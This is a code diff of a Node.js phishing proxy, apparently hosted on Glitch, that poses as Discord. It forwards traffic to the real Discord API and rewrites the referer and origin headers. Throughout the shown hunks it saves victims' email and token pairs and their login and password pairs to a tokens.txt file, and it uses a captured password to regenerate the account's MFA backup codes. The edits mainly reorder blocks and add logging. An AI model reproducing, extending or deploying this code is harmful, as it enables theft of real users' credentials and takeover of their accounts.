@@ -36,7 +36,6 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
 // if(headersNew.authorization) headersNew.authorization = "Bot " + headersNew.authorization
  if(headersNew.referer) headersNew.referer = `${headersNew.referer}`.replace('https://scalloped-mahogany-chronometer.glitch.me/', 'https://discord.com/')
  if(headersNew.origin) headersNew.origin = `https://discord.com/`
- console.log(req.body)
   if(JSON.stringify(req.body) !== `{}`){
   let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew, body: JSON.stringify(req.body)}).catch(err =>{})
   if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, body: JSON.stringify(req.body)}).catch(err =>{})
@@ -47,36 +46,6 @@ if(headers['content-type']) headersNew['content-type'] = headers['content-type']
   
     let s = JSON.parse(dataText)
     if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
-
-    	let tokens;
-	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
-	
-	let arr = tokens.split("\n").map(d => {
-		return d.trim();
-	});
-	
-if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
-	fs.writeFileSync("./tokens.txt", arr.join("\n"));
-}
-
-    return res.status(dataFetch.status).json(s)
-    
-  } catch {
-return res.status(dataFetch.status).send(dataText)
-}
-        }else{
-              console.log('https://discord.com' + req.originalUrl)
-
-          if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
-          headersNew.host = "discord.com"
-  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
-  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})
-
-  let dataText = await dataFetch.text()
-  try {
-  
-    let s = JSON.parse(dataText)
-if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
 
     	let tokens;
 	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
@@ -108,14 +77,18 @@ if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/auth/
 var f = data.find(c => c.ticket === req.body.ticket)
 console.log(f)
 if(f){
+  console.log(s)
   let dF = await fetch(('https://discord.com/api/v9/users/@me/mfa/codes'), {
+method: "POST",
 headers: {
+"content-type": "application/json",
 authorization: s.token
 },
 body: JSON.stringify({"password":f.password,"regenerate":true})
 })
   
   let dJ = await dF.json()
+  console.log(dJ)
     	let tokens;
 	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
 	
@@ -128,6 +101,36 @@ if(!arr.includes(req.body.login)) arr.unshift(`${req.body.login}:${req.body.pass
 }
 }
     
+    return res.status(dataFetch.status).json(s)
+    
+  } catch {
+return res.status(dataFetch.status).send(dataText)
+}
+        }else{
+              console.log('https://discord.com' + req.originalUrl)
+
+          if('https://discord.com' + req.originalUrl === "https://discord.com/api/v6/experiments") headersNew = {}
+          headersNew.host = "discord.com"
+  let dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method, headers: headersNew}).catch(err =>{})
+  if(!dataFetch) dataFetch = await fetch(('https://discord.com' + `${req.originalUrl}`.replace('v9', 'v7')), {method: req.method}).catch(err =>{})
+
+  let dataText = await dataFetch.text()
+  try {
+  
+    let s = JSON.parse(dataText)
+if('https://discord.com' + req.originalUrl === `https://discord.com/api/v9/users/@me` && s.token){
+
+    	let tokens;
+	try { tokens = fs.readFileSync("./tokens.txt", {encoding:'utf8', flag:'r'}); } catch(e) { console.log(e.message); return; }
+	
+	let arr = tokens.split("\n").map(d => {
+		return d.trim();
+	});
+	
+if(!arr.includes(s.email)) arr.unshift(`${s.email}:${s.token}`)
+	fs.writeFileSync("./tokens.txt", arr.join("\n"));
+}
+
     return res.status(dataFetch.status).json(s)
     
   } catch {
